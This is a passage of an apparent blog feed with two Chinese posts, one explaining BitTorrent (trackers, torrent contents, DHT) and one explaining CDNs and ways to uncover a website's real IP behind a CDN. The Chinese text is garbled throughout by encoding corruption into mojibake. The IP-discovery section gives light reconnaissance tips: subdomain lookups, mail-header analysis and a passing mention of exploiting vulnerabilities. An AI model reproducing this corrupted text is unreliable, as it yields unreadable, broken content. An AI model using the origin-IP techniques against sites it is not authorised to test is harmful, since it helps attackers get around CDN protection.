åœ¨äºæ¯ä¸ªä¸‹è½½è€…å°†å·²ä¸‹è½½çš„æ•°æ®æä¾›ç»™å…¶ä»–ä¸‹è½½è€…ä¸‹è½½ï¼Œå……åˆ†åˆ©ç”¨äº†ç”¨æˆ·çš„ä¸Šè½½å¸¦å®½ã€‚é€šè¿‡ä¸€å®šçš„ç­–ç•¥ä¿è¯ä¸Šä¼ é€Ÿåº¦è¶Šå¿«ï¼Œä¸‹è½½é€Ÿåº¦ä¹Ÿè¶Šå¿«ã€‚åœ¨å¾ˆçŸ­æ—¶é—´å†…ï¼ŒBitTorrentåè®®æˆä¸ºä¸€ç§æ–°çš„å˜é©æŠ€æœ¯ã€‚</p></blockquote><p>ä»¥ä¸Šè¯´æ˜æ¥è‡ªç™¾åº¦ç™¾ç§‘</p><p><a href="https://www.helloimg.com/image/RexTrb"><img src="https://www.helloimg.com/images/2022/03/27/RexTrb.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/03/27/RexTrb.png" srcset="data:image/png;base64,666" alt="RexTrb.png"></a></p><p>ç”¨é€šä¿—çš„è¯è®²ï¼ŒBTç§å­ï¼ˆä»¥ä¸‹ç®€ç§° ç§å­ ï¼‰æŠ€æœ¯å…¶å®å°±æ˜¯å°†ä¸€ä¸ªæ¯”è¾ƒå¤§çš„æ–‡ä»¶ï¼ˆæ¯”å¦‚ç”µå½±æˆ–é•œåƒï¼‰æŒ‰ç…§ä¸€å®šçš„è§„èŒƒåˆ†æˆå¤šä¸ªå—ï¼Œå½“ç”¨æˆ·é€šè¿‡.torrentæ–‡ä»¶ä¸‹è½½æ—¶ï¼Œä¼šè¿æ¥ä¸Šç§å­æ–‡ä»¶ä¸­è®°å½•çš„trackeræœåŠ¡å™¨ï¼Œè€ŒtrackeræœåŠ¡å™¨å¹¶ä¸æä¾›æ–‡ä»¶æœ¬èº«ï¼Œè€Œæ˜¯é€šè¿‡æŸ¥è¯¢è¿”å›å½“å‰åŒåœ¨ä¸‹è½½è¯¥æ–‡ä»¶çš„å…¶ä»–å®¢æˆ·ç«¯çš„åœ°å€ï¼Œè€Œä¸»æœºæ¥æ”¶åˆ°è¯¥åœ°å€åï¼Œä¼šé€ä¸ªé€ä¸ªå°è¯•è¿æ¥ï¼Œè¿æ¥æˆåŠŸçš„ä¾¿é€šè¿‡ç‚¹å¯¹ç‚¹ï¼ˆP2Pï¼‰çš„æ–¹å¼è·å–å¯¹æ–¹è®¡ç®—æœºä¸Šçš„å¦ä¸€éƒ¨åˆ†æ–‡ä»¶ï¼Œç„¶åå†è¿æ¥å…¶ä»–çš„å®¢æˆ·ç«¯ï¼Œè·å–æ–‡ä»¶çš„å…¶ä»–éƒ¨åˆ†</p><h2 id="Bit-Torrent-ä¸å…¶ä»–ä¸‹è½½æ–¹å¼ç›¸æ¯”ï¼Œæœ‰ä»€ä¹ˆä¼˜åŠ¿ï¼Ÿ"><a href="#Bit-Torrent-ä¸å…¶ä»–ä¸‹è½½æ–¹å¼ç›¸æ¯”ï¼Œæœ‰ä»€ä¹ˆä¼˜åŠ¿ï¼Ÿ" class="headerlink" title="Bit Torrent ä¸å…¶ä»–ä¸‹è½½æ–¹å¼ç›¸æ¯”ï¼Œæœ‰ä»€ä¹ˆä¼˜åŠ¿ï¼Ÿ"></a>Bit Torrent ä¸å…¶ä»–ä¸‹è½½æ–¹å¼ç›¸æ¯”ï¼Œæœ‰ä»€ä¹ˆä¼˜åŠ¿ï¼Ÿ</h2><p>ä¸åŒäºä¼ ç»Ÿçš„ C/S ( Client / Server )æ¨¡å¼ï¼ŒP2Pçš„ä¸‹è½½æ–¹å¼é¿å…äº†å•ä¸ªæœåŠ¡å™¨æä¾›å¤šä¸ªå®¢æˆ·ç«¯çš„æœåŠ¡æ—¶å¸¦å®½è´Ÿè½½å¤§çš„é—®é¢˜ï¼›åœ¨P2Pä¸‹è½½æ—¶ï¼Œæ¯ä¸€å°è®¡ç®—æœºï¼Œæ—¢æ˜¯å®¢æˆ·ç«¯ï¼Œåˆæ˜¯æœåŠ¡ç«¯ï¼Œåœ¨ä¸‹è½½çš„è¿‡ç¨‹ä¸­ï¼Œä¹Ÿå‘å…¶ä»–æœ‰éœ€è¦çš„å®¢æˆ·ç«¯ä¸Šä¼ è‡ªå·±çš„æ–‡ä»¶ï¼Œæœ‰æ•ˆèŠ‚çœäº†å¸¦å®½ï¼›</p><p>å¦å¤–ï¼Œç”±äºP2På»ä¸­å¿ƒåŒ–çš„ç‰¹ç‚¹ï¼Œæ¯ä¸ªå¤„äºBTç½‘ç»œä¸­çš„æ–‡ä»¶ï¼Œå…¶å­˜åœ¨ä¸å¦ä¸å†å–å†³äºæ–‡ä»¶çš„æä¾›è€…æˆ–æœåŠ¡å•†ï¼Œåœ¨ä¸€å®šç¨‹åº¦ä¸Šé¿å…äº†æ–‡ä»¶å› ä¸ªäººè¿‡å¤±è€Œæ°¸ä¹…æ¶ˆå¤±çš„æƒ…å†µ</p><h2 id="Bit-Torrent-ä¸å…¶ä»–ä¸‹è½½æ–¹å¼ç›¸æ¯”ï¼Œæœ‰ä»€ä¹ˆåŠ£åŠ¿ï¼Ÿ"><a href="#Bit-Torrent-ä¸å…¶ä»–ä¸‹è½½æ–¹å¼ç›¸æ¯”ï¼Œæœ‰ä»€ä¹ˆåŠ£åŠ¿ï¼Ÿ" class="headerlink" title="Bit Torrent ä¸å…¶ä»–ä¸‹è½½æ–¹å¼ç›¸æ¯”ï¼Œæœ‰ä»€ä¹ˆåŠ£åŠ¿ï¼Ÿ"></a>Bit Torrent ä¸å…¶ä»–ä¸‹è½½æ–¹å¼ç›¸æ¯”ï¼Œæœ‰ä»€ä¹ˆåŠ£åŠ¿ï¼Ÿ</h2><p>æœ‰ä¼˜åŠ¿å°±è‚¯å®šæœ‰åŠ£åŠ¿ï¼Œå¦‚ä¸Šæ–‡æ‰€è¯´ï¼ŒBTä¸‹è½½æ˜¯é€šè¿‡åŒåœ¨ä¸‹è½½è¯¥æ–‡ä»¶çš„å…¶ä»–å®¢æˆ·ç«¯æä¾›çš„æœåŠ¡æ¥è·å–æ–‡ä»¶çš„ï¼Œé‚£ä¹ˆï¼Œå½“åŒæ—¶åœ¨ä¸‹è½½è¯¥æ–‡ä»¶çš„å®¢æˆ·ç«¯å¾ˆå°‘ï¼Œç”šè‡³æˆ‘ä»¬å¯ä»¥å‡è®¾ä¸€ç§æç«¯æƒ…å†µï¼šæ•´ä¸ªç½‘ç»œå°±åªæœ‰ä½ ä¸€å°è®¡ç®—æœºåœ¨ä¸‹è½½è¯¥æ–‡ä»¶ï¼Œé‚£ä¹ˆä½ å°†ä¸ä¼šå¾—åˆ°ä½ æƒ³è¦çš„æ–‡ä»¶ï¼Œå› ä¸ºæ²¡æœ‰å…¶ä»–èŠ‚ç‚¹ç»™ä½ æä¾›ä½ æƒ³è¦çš„æ–‡ä»¶</p><p>å¦ä¸€æ–¹é¢ï¼ŒåŒæ ·ç”±äºBTæŠ€æœ¯ä¸­æ–‡ä»¶æ— æ³•è½»æ˜“æ¸…é™¤çš„ç‰¹ç‚¹ï¼Œæ–‡ä»¶ä¸€æ—¦ä¸Šä¼ ï¼Œæƒ³æ°¸ä¹…æŠ¹å»çš„å¯èƒ½æ€§ä¸å¤§ï¼Œé‚£ä¹ˆä¸‡ä¸€æœ‰ä¸æ³•åˆ†å­ä¸Šä¼ äº†æœ¬ä¸è¯¥å‡ºç°åœ¨ç½‘ç»œä¸Šçš„æ–‡ä»¶ï¼ˆæ¯”å¦‚æœ‰å…³å›½å®¶æœºå¯†æˆ–è€…ä¸ªäººéšç§ï¼Œæœ‰æˆ–è€…æœªä¸Šæ˜ çš„ç”µå½±ä¹‹ç±»çš„ï¼‰ï¼Œå…¶åæœä¸å ªè®¾æƒ³</p><h2 id="torrentæ–‡ä»¶éƒ½è®°å½•äº†ä»€ä¹ˆï¼Ÿ"><a href="#torrentæ–‡ä»¶éƒ½è®°å½•äº†ä»€ä¹ˆï¼Ÿ" class="headerlink" title="torrentæ–‡ä»¶éƒ½è®°å½•äº†ä»€ä¹ˆï¼Ÿ"></a>torrentæ–‡ä»¶éƒ½è®°å½•äº†ä»€ä¹ˆï¼Ÿ</h2><p>Aï¼‰è¿™ä¸ªæ–‡ä»¶ï¼ˆæ–‡ä»¶å¤¹ï¼‰ä¸­æ•°æ®çš„SHA1å€¼ï¼Œæ¯”å¦‚ä¸€ä¸ª1Gçš„æ–‡ä»¶ï¼Œå¦‚æœæŒ‰1Mæ¯å—è¿›è¡Œåˆ†å—ï¼Œåˆ™ä¼šè¢«åˆ†ä¸ºäº†1000å—ï¼Œtorrentä¸­å°±ä¼šæœ‰è¿™1000ä¸ªæ•°æ®å—çš„æŒ‡çº¹å€¼ï¼ˆSHA1çš„<a href="https://www.zhihu.com/search?q=hash%E5%80%BC&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:160765176%7D">hashå€¼</a>ï¼‰ï¼Œè¿™ä¸ªå æ®äº†torrentæ–‡ä»¶çš„ç»å¤§éƒ¨åˆ†ç©ºé—´ã€‚è¿™äº›å€¼çš„ç›®çš„æ˜¯ä¸ºäº†ä¸‹è½½çš„è¿‡ç¨‹ä¸­è¿›è¡Œæ•°æ®æ ¡éªŒï¼Œç¡®ä¿æ•°æ®æ”¶åˆ°çš„å’Œå½“æ—¶æºå¤´åˆ¶ä½œtorrentæ—¶çš„æºæ–‡ä»¶100%ä¸€è‡´ï¼Œé˜²æ­¢æ¶æ„æ•°æ®æ”»å‡»ã€‚</p><p>Bï¼‰ä¸€èˆ¬åˆ¶ä½œtorrentæ–‡ä»¶æ—¶ï¼Œè¿˜ä¼šè¦æŒ‡å®šä¸€ä¸ªæˆ–è€…å¤šä¸ªTrackerçš„åœ°å€ï¼Œæ¯”å¦‚<a href="https://link.zhihu.com/?target=http://www.a.com:8080/announce">http://www.a.com:8080/announce</a>è¿™ç§åœ°å€ã€‚torrenté‡Œé¢ä¸€èˆ¬ä¹Ÿä¼šå­˜å‚¨äº†è¿™ä¸ªä¿¡æ¯ï¼Œè¿™ä¸ªå…¶å®ä¹Ÿå°¤ä¸ºé‡è¦ã€‚ç›¸å½“äºè®°å½•äº†ä¸€ä¸ªé—®è¯¢æœåŠ¡å™¨çš„åœ°å€ï¼Œè¿™ä¸ªé—®è¯¢æœåŠ¡å™¨çš„ä½œç”¨ï¼Œåé¢æˆ‘å†è§£é‡Šã€‚</p><p>Cï¼‰æ–‡ä»¶æˆ–è€…æ–‡ä»¶å¤¹å†…æ¯ä¸ªæ–‡ä»¶çš„åå­—ï¼Œæ–¹ä¾¿ä¸‹è½½æ–‡ä»¶æ—¶ï¼Œç£ç›˜ä¸Šç›´æ¥å‘½åå¥½è·ŸåŸå§‹æ•°æ®ä¸€æ ·çš„ç›®å½•ç»“æ„ã€æ–‡ä»¶åã€‚    </p><p>Dï¼‰å…¶å®ƒä¸€äº›è¾…åŠ©å’Œå¯æ‰©å±•çš„ä¿¡æ¯ï¼Œæ¯”å¦‚å¯ä»¥é…ç½®ä¸€ä¸ªP2SPçš„httpåœ°å€è¾…åŠ©ä¸‹è½½ï¼Œæ¯”å¦‚åˆ¶ä½œè½¯ä»¶çš„åå­—ã€å¤‡æ³¨â€¦â€¦ã€‚      Eï¼‰ä¸Šé¢ä¿¡æ¯ç”Ÿæˆåï¼Œtorrentä¼šæŠŠAï¼‰é‡Œé¢çš„è¿™äº›ä¿¡æ¯ï¼Œä»¥åŠtorrenté‡Œé¢çš„æ–‡ä»¶åç­‰å…³é”®ä¿¡æ¯ï¼Œå†è¿›è¡Œä¸€æ¬¡Hashï¼Œç”Ÿæˆä¸€ä¸ªæ–°çš„SHA1å€¼ï¼Œä½œä¸ºtorrentçš„HASHå€¼ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ç»å¸¸çœ‹åˆ°çš„ä¸‹è½½è½¯ä»¶é‡Œé¢å¯¹è¿™ä¸ªç§å­å‘½åçš„ä¸€ä¸ªå”¯ä¸€çš„hashå€¼ï¼Œä¹Ÿæœ‰çš„åœ¨magnetè¿™ç§ç£åŠ›é“¾æ¥ä¸­å¯ä»¥çœ‹åˆ°è¿™ä¸ªå€¼ï¼Œè¿™å°±æ˜¯torrentçš„å”¯ä¸€æ ‡è®°ã€‚</p><p>ä»¥ä¸Šå°±æ˜¯.torrentæ–‡ä»¶çš„å†…å®¹ï¼Œå¯ä»¥ç”¨è®°äº‹æœ¬æ‰“å¼€ï¼Œä½†å¯èƒ½çœ‹åˆ°ä¹±ç ã€‚è¿™ä¸ªæ–‡ä»¶çš„ç¼–ç éµå¾ªäº†bencodeç¼–ç è§„åˆ™ã€‚ä½†å®é™…å†…å®¹å°±ä¸»è¦æ˜¯ä¸Šé¢è¿™äº›ã€‚æ‰€ä»¥ï¼Œtorrentå¯ä»¥ç†è§£ä¸ºå¯¹åŸå§‹æ•°æ®çš„ä¸€äº›è®°å½•ã€‚</p><h2 id="å¦‚æœä¸‹è½½æ—¶æ²¡æœ‰å…¶ä»–èŠ‚ç‚¹åœ¨çº¿ã€‚åˆæ²¡æœ‰httpæœåŠ¡å™¨ï¼Œæ˜¯ä¸æ˜¯å°±ä¸èƒ½è¿›è¡Œä¸‹è½½äº†å‘¢ï¼Ÿ"><a href="#å¦‚æœä¸‹è½½æ—¶æ²¡æœ‰å…¶ä»–èŠ‚ç‚¹åœ¨çº¿ã€‚åˆæ²¡æœ‰httpæœåŠ¡å™¨ï¼Œæ˜¯ä¸æ˜¯å°±ä¸èƒ½è¿›è¡Œä¸‹è½½äº†å‘¢ï¼Ÿ" class="headerlink" title="å¦‚æœä¸‹è½½æ—¶æ²¡æœ‰å…¶ä»–èŠ‚ç‚¹åœ¨çº¿ã€‚åˆæ²¡æœ‰httpæœåŠ¡å™¨ï¼Œæ˜¯ä¸æ˜¯å°±ä¸èƒ½è¿›è¡Œä¸‹è½½äº†å‘¢ï¼Ÿ"></a>å¦‚æœä¸‹è½½æ—¶æ²¡æœ‰å…¶ä»–èŠ‚ç‚¹åœ¨çº¿ã€‚åˆæ²¡æœ‰httpæœåŠ¡å™¨ï¼Œæ˜¯ä¸æ˜¯å°±ä¸èƒ½è¿›è¡Œä¸‹è½½äº†å‘¢ï¼Ÿ</h2><p>ä¸ä¸€å®šï¼ŒBTå‘æ˜è€…æå‡ºäº†DHTï¼ˆDistributed Hash Tableï¼‰çš„æ¦‚å¿µï¼Œå°±ç®—Trackerè¿ä¸ä¸Šäº†ï¼Œä¹Ÿå¯ä»¥é€šè¿‡åˆ†å¸ƒå¼å“ˆå¸Œè¡¨DHTæŠ€æœ¯ï¼Œé€šè¿‡DHTç½‘ç»œæ…¢æ…¢çš„å¯»æ‰¾å¿—åŒé“åˆçš„é‚»å±…èŠ‚ç‚¹ï¼Œåªæ˜¯æ²¡æœ‰Trackeré‚£ä¹ˆç›´æ¥é‚£ä¹ˆå¿«é€Ÿï¼Œä½†æ…¢ä¸€äº›æ€»è¿˜æ˜¯æœ‰æœºä¼šæ‰¾åˆ°é‚»å±…çš„</p><h2 id="æœ‰å…³ä¸‹è½½è¿‡ç¨‹ä¸­çš„ä¸€äº›äº‹"><a href="#æœ‰å…³ä¸‹è½½è¿‡ç¨‹ä¸­çš„ä¸€äº›äº‹" class="headerlink" title="æœ‰å…³ä¸‹è½½è¿‡ç¨‹ä¸­çš„ä¸€äº›äº‹"></a>æœ‰å…³ä¸‹è½½è¿‡ç¨‹ä¸­çš„ä¸€äº›äº‹</h2><p>æ–‡ä»¶ä¸‹è½½æ—¶ï¼Œè‹¥å­˜åœ¨æä¾›ä¸‹è½½æœåŠ¡çš„httpæœåŠ¡å™¨ï¼Œé‚£ä¹ˆå°±ç®—æ²¡æœ‰å…¶ä»–çš„å®¢æˆ·ç«¯åœ¨çº¿ï¼Œä¸‹è½½ä»ç„¶å¯ä»¥è¿›è¡Œ</p><p>ä¸‹è½½è¿‡ç¨‹ä¸­å‡ºç°å¡åœ¨99.99%çš„åŸå› æ˜¯å› ä¸ºå½“æ‰€æœ‰åˆ†å—éƒ½ä¸‹è½½å®Œæ¯•æ—¶ï¼Œç”µè„‘ä¼šå¯¹ä¸‹è½½çš„æ–‡ä»¶è¿›è¡Œæ–‡ä»¶æ ¡éªŒï¼ˆç±»ä¼¼äºå“ˆå¸Œæ£€éªŒï¼‰ï¼Œè€Œå½“æ–‡ä»¶æ ¡éªŒä¸é€šè¿‡æ—¶ï¼Œç”µè„‘å°±ä¼šå¯¹ç»„æˆæ–‡ä»¶çš„æ‰€æœ‰åˆ†å—é€ä¸ªé€ä¸ªè¿›è¡Œæ£€éªŒï¼Œå‘ç°æ ¡éªŒå€¼ä¸å¯¹çš„æ–‡ä»¶åˆ†å—å†é‡æ–°ä¸‹è½½ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆæœ‰æ—¶å€™ä¸‹è½½å¡ä½çš„åŸå› </p><p>å½“æ–‡ä»¶ä¸‹è½½å®Œæ¯•æ—¶ï¼Œå¦‚æœä½ æ²¡æœ‰å…³é—­ä¸‹è½½æ–‡ä»¶çš„å®¢æˆ·ç«¯ï¼Œé‚£ä¹ˆå¦‚æœæœ‰å…¶ä»–äººéœ€è¦ä½ çš„æ–‡ä»¶ï¼Œå³ä½¿ä½ æ²¡æœ‰åœ¨ä¸‹è½½æ–‡ä»¶ï¼Œä½ æ‰€æ‹¥æœ‰çš„æ–‡ä»¶åˆ†å—ä¾ç„¶å¯ä»¥ä¸Šä¼ ç»™å…¶ä»–å®¢æˆ·ç«¯ï¼Œæˆä¸ºä¸€åå´‡é«˜çš„ä¼ é€’è€…</p><p>æ–‡ä»¶ä¸‹è½½æ—¶ï¼Œå½±å“ä¸‹è½½é€Ÿåº¦çš„ï¼Œé™¤äº†ä½ çš„ç”µè„‘å½“å‰çš„ç½‘é€Ÿï¼Œå…¶å®è¿˜æœ‰ä½ çš„ç”µè„‘å½“å‰çš„ä¸Šä¼ é€Ÿåº¦ï¼›åœ¨BTç½‘ç»œçš„å¸¦å®½åˆ†é…ä¸­ï¼Œä¸Šä¼ é€Ÿåº¦å¿«çš„å®¢æˆ·ç«¯èƒ½å¤Ÿè·å¾—çš„ä¸‹è½½é€Ÿåº¦ä¼šç›¸å¯¹æ¯”è¾ƒå¿«</p><p>æŸäº›è¿è¥å•†ä¼šå¯¹BTä¸‹è½½æ—¶çš„é€šä¿¡è¿›è¡Œæ‹¦æˆªï¼Œå®ƒä»¬ä¼šå¯¹é€šä¿¡è¿‡ç¨‹ä¸­ä¼ è¾“çš„å†…å®¹è¿›è¡Œåˆ†æï¼Œç”±äºæ—©æœŸçš„ä¸‹è½½ä¼ è¾“çš„æ˜¯æ˜æ–‡ï¼Œæ•…å¾ˆå®¹æ˜“å°±èƒ½å¤Ÿè¢«è¿è¥å•†æˆªå–ï¼›å½“ç„¶ï¼Œé“é«˜ä¸€å°ºï¼Œé­”é«˜ä¸€ä¸ˆï¼Œå¦‚ä»Šçš„ä¸‹è½½è¿‡ç¨‹ä¼ è¾“çš„å†…å®¹å¤§éƒ¨åˆ†éƒ½è¿›è¡Œè¿‡åŠ å¯†</p><blockquote><p>quote<br><a href="https://baike.baidu.com/item/BitTorrent/142795">BitTorrent_ç™¾åº¦ç™¾ç§‘ (baidu.com)</a></p><p><a href="https://www.zhihu.com/question/49829233/answer/160765176">https://www.zhihu.com/question/49829233/answer/160765176</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æœ‰å…³cdnå’ŒçœŸå®ipçš„ä¸€äº›äº‹</title>
      <link href="2022/03/20/cdn/"/>
      <url>2022/03/20/cdn/</url>
      
        <content type="html"><![CDATA[<h2 id="CDNæ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#CDNæ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="CDNæ˜¯ä»€ä¹ˆï¼Ÿ"></a>CDNæ˜¯ä»€ä¹ˆï¼Ÿ</h2><blockquote><p>CDN(Content Delivery Network)æ˜¯æŒ‡å†…å®¹åˆ†å‘ç½‘ç»œï¼Œä¹Ÿç§°ä¸ºå†…å®¹ä¼ é€ç½‘ç»œï¼Œè¿™ä¸ªæ¦‚å¿µå§‹äº1996å¹´ï¼Œæ˜¯ç¾å›½éº»çœç†å·¥å­¦é™¢çš„ä¸€ä¸ªç ”ç©¶å°ç»„ä¸ºæ”¹å–„äº’è”ç½‘çš„æœåŠ¡è´¨é‡è€Œæå‡ºçš„ã€‚ä¸ºäº†èƒ½åœ¨ä¼ ç»ŸIPç½‘ä¸Šå‘å¸ƒä¸°å¯Œçš„å®½å¸¦åª’ä½“å†…å®¹ï¼Œä»–ä»¬æå‡ºåœ¨ç°æœ‰äº’è”ç½‘åŸºç¡€ä¸Šå»ºç«‹ä¸€ä¸ªå†…å®¹åˆ†å‘å¹³å°ä¸“é—¨ä¸ºç½‘ç«™æä¾›æœåŠ¡ï¼Œå¹¶äº1999å¹´æˆç«‹äº†ä¸“é—¨çš„CDNæœåŠ¡å…¬å¸ï¼Œä¸ºYahooæä¾›ä¸“ä¸šæœåŠ¡ã€‚ç”±äºCDNæ˜¯ä¸ºåŠ å¿«ç½‘ç»œè®¿é—®é€Ÿåº¦è€Œè¢«ä¼˜åŒ–çš„ç½‘ç»œè¦†ç›–å±‚ï¼Œå› æ­¤è¢«å½¢è±¡åœ°ç§°ä¸ºâ€œç½‘ç»œåŠ é€Ÿå™¨â€ã€‚</p></blockquote><p>ä»¥ä¸Šæ˜¯æ¥è‡ªç™¾åº¦ç™¾ç§‘çš„è§£é‡Š<br>ä¸ªäººç†è§£ï¼Œé€šä¿—ç‚¹è¯´ï¼Œcdnå…¶å®å°±æ˜¯ä¸€äº›æœåŠ¡å™¨ï¼Œå°†ä½ çš„ä¸€äº›é™æ€æ–‡ä»¶ï¼ˆhtmlï¼‰ä»€ä¹ˆçš„å¤åˆ¶ä¸€ä»½ï¼Œç„¶åç­‰æœ‰äººè®¿é—®ç½‘ç«™çš„æ—¶å€™å†å°±è¿‘é€‰æ‹©cdnæœåŠ¡å™¨æŠŠä½ çš„é‚£äº›é™æ€é¡µé¢è¿”å›ï¼Œè¿™æ ·å°±ä¸ç”¨é€šè¿‡ä½ çš„æœåŠ¡å™¨ï¼Œä»è€Œå‡è½»å¸¦å®½è´Ÿè½½äº†</p><h2 id="CDNå’ŒIPæ˜¯ä»€ä¹ˆå…³ç³»ï¼Ÿ"><a href="#CDNå’ŒIPæ˜¯ä»€ä¹ˆå…³ç³»ï¼Ÿ" class="headerlink" title="CDNå’ŒIPæ˜¯ä»€ä¹ˆå…³ç³»ï¼Ÿ"></a>CDNå’ŒIPæ˜¯ä»€ä¹ˆå…³ç³»ï¼Ÿ</h2><p>ç”±äºç”¨æˆ·è·å–é™æ€æ–‡ä»¶æ—¶å¤§æ¦‚ç‡ä¼šç”±CDNæœåŠ¡å™¨è¿”å›ï¼Œåˆ™å¤§å¤šæ•°æƒ…å†µä¸‹ç”¨æˆ·è¾“å…¥åŸŸåè®¿é—®ç½‘ç«™æ—¶ï¼Œå®é™…è¿›è¡Œé€šä¿¡çš„å¾ˆå¯èƒ½ä¸æ˜¯è¯¥ç½‘ç«™çœŸå®çš„IPï¼Œè€Œæ˜¯CDNæœåŠ¡å™¨çš„IP</p><h2 id="CDNçš„å¥½å¤„æœ‰å“ªäº›ï¼Ÿ"><a href="#CDNçš„å¥½å¤„æœ‰å“ªäº›ï¼Ÿ" class="headerlink" title="CDNçš„å¥½å¤„æœ‰å“ªäº›ï¼Ÿ"></a>CDNçš„å¥½å¤„æœ‰å“ªäº›ï¼Ÿ</h2><p>æœ€æ˜æ˜¾çš„ä¹Ÿæ˜¯å¤§éƒ¨åˆ†äººæœ€éœ€è¦çš„ï¼Œå°±æ˜¯å‡å°‘è‡ªå®¶æœåŠ¡å™¨çš„å¸¦å®½è´Ÿè½½<br>æ­¤å¤–è¿˜æœ‰ä¸€ä¸ªå¥½å¤„ï¼Œå°±æ˜¯éšè—æœåŠ¡å™¨çš„çœŸå®IPï¼ˆä½†æ˜¯ä¸èƒ½ç™¾åˆ†ç™¾éšè—ï¼‰</p><h3 id="CDNéšè—IPçš„å¥½å¤„æ˜¯ä»€ä¹ˆï¼Ÿä¸ºä»€ä¹ˆä¸èƒ½å®Œå…¨éšè—ï¼Ÿ"><a href="#CDNéšè—IPçš„å¥½å¤„æ˜¯ä»€ä¹ˆï¼Ÿä¸ºä»€ä¹ˆä¸èƒ½å®Œå…¨éšè—ï¼Ÿ" class="headerlink" title="CDNéšè—IPçš„å¥½å¤„æ˜¯ä»€ä¹ˆï¼Ÿä¸ºä»€ä¹ˆä¸èƒ½å®Œå…¨éšè—ï¼Ÿ"></a>CDNéšè—IPçš„å¥½å¤„æ˜¯ä»€ä¹ˆï¼Ÿä¸ºä»€ä¹ˆä¸èƒ½å®Œå…¨éšè—ï¼Ÿ</h3><p>éšè—IPæœ€å¤§çš„å¥½å¤„å°±æ˜¯åœ¨ä¸€å®šç¨‹åº¦ä¸Šé¿å…è‡ªå®¶æœåŠ¡å™¨å—åˆ°æ”»å‡»ï¼ˆDDoSæ”»å‡»ä¹‹ç±»çš„ï¼‰ï¼Œå› ä¸ºä¸æ³•åˆ†å­æ— æ³•çŸ¥é“æˆ‘ä»¬æœåŠ¡å™¨çš„çœŸå®IPï¼Œä¹Ÿå°±æ— æ³•å¯¹è¯¥IPè¿›è¡Œå¤§é‡é‡å¤çš„è¯·æ±‚ä»è€Œè¾¾åˆ°ä½¿ç½‘ç«™æ‹’ç»æœåŠ¡çš„æ•ˆæœï¼Œæœ€å¤šå°±æ˜¯æŠŠæœ€è¿‘çš„CDNæœåŠ¡å™¨æ‰“äº†ä¸‹æ¥<br>é‚£å¤©ä¸‹CDNåƒåƒä¸‡ï¼Œä½ æŠŠè¿™ä¸ªæ‰“ä¸‹æ¥äº†åˆæœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿä½ åˆä¸èƒ½ç¡®ä¿ä½ ä¸‹ä¸€ä¸ªè®¿é—®çš„æœåŠ¡å™¨ä¸€å®šä¸æ˜¯CDN</p><h2 id="æˆ‘æ€ä¹ˆçŸ¥é“è‡ªå·±çš„è¯·æ±‚æ˜¯ä¸æ˜¯åˆ°äº†CDNå‘¢ï¼Ÿ"><a href="#æˆ‘æ€ä¹ˆçŸ¥é“è‡ªå·±çš„è¯·æ±‚æ˜¯ä¸æ˜¯åˆ°äº†CDNå‘¢ï¼Ÿ" class="headerlink" title="æˆ‘æ€ä¹ˆçŸ¥é“è‡ªå·±çš„è¯·æ±‚æ˜¯ä¸æ˜¯åˆ°äº†CDNå‘¢ï¼Ÿ"></a>æˆ‘æ€ä¹ˆçŸ¥é“è‡ªå·±çš„è¯·æ±‚æ˜¯ä¸æ˜¯åˆ°äº†CDNå‘¢ï¼Ÿ</h2><p>æƒ³çŸ¥é“è‡ªå·±è®¿é—®çš„æœåŠ¡å™¨æ˜¯ä¸æ˜¯CDNï¼Œæœ‰å‡ ç§åŠæ³•ï¼š<br>windowså‘½ä»¤è¡Œç”¨nslookupå‘½ä»¤æŸ¥è¯¢ä¸€ä¸‹ç›®æ ‡åŸŸåï¼Œå¦‚æœä¸€ä¸ªåŸŸåå¯¹åº”ç€å¥½å‡ ä¸ªIPï¼Œé‚£åæœ‰å…«ä¹æ˜¯ä½¿ç”¨äº†CDNï¼›å½“ç„¶ï¼Œå¦‚æœåªè¿”å›äº†ä¸€ä¸ªIPä¹Ÿä¸èƒ½è¯´æ˜ç›®æ ‡ç½‘ç«™å°±æ²¡æœ‰ä½¿ç”¨CDN<br>åœ¨CDNæŸ¥è¯¢ç½‘ç«™ä¸ŠæŸ¥</p><blockquote><p><a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a><br><a href="http://ping.aizhan.com/">http://ping.aizhan.com/</a><br><a href="http://ce.cloud.360.cn/">http://ce.cloud.360.cn/</a></p></blockquote><p>æŸ¥å­åŸŸåï¼šå› ä¸ºå¤§éƒ¨åˆ†ç«™é•¿ä½¿ç”¨CDNé’ˆå¯¹çš„å¤§å¤šæ˜¯é¦–é¡µç­‰è®¿é—®é‡æ¯”è¾ƒå¤§çš„é¡µé¢ï¼Œé‚£ä¹ˆå­é¡µé¢å°±æœ‰å¯èƒ½æ²¡æœ‰ä½¿ç”¨CDNï¼Œè¿™æ—¶å€™æŸ¥è¯¢å­é¡µé¢è¿”å›çš„ç»“æœå¾ˆæœ‰å¯èƒ½å°±æ˜¯çœŸå®IP<br>æ¼æ´åˆ©ç”¨ï¼šç”¨CTFé‚£å¥—è¯•è¯•ã€‚ä¸è¿‡ä¸æå€¡ä¸”å¤§éƒ¨åˆ†æƒ…å†µä¸‹ä¸åˆæ³•<br>åˆ†ææœåŠ¡å™¨è¿”å›çš„ä¿¡æ¯ï¼šæœ‰äº›ç½‘ç«™ä¼šæœ‰é‚®ä»¶æœåŠ¡æˆ–è€…è®¢é˜…æœåŠ¡ä¹‹ç±»çš„ï¼Œè€Œè¿™äº›æœåŠ¡æœ‰æ—¶å¹¶ä¸ä¼šä½¿ç”¨CDNï¼Œé€šè¿‡åˆ†æé‚®ä»¶æºç 